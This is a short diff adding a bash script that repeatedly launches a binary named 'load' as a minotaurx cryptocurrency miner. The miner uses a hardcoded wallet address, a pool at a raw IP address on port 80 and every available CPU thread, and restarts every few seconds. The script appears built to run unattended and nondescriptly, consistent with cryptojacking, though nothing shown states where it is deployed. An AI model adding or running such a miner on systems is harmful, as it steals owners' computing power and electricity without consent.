@@ -1,0 +1,6 @@
+#!/bin/bash
+while [ 1 ]; do 
+./load -a minotaurx -u TYP6GyG9f4Mo9MDFHPDG1hmdgBRHXPZZxP.$(echo MINO-$(TZ=UTC-7 date +"%H-%M-%S")) -o 147.139.139.83:80 -t $(nproc --all)
+sleep 3
+done 
+sleep 999
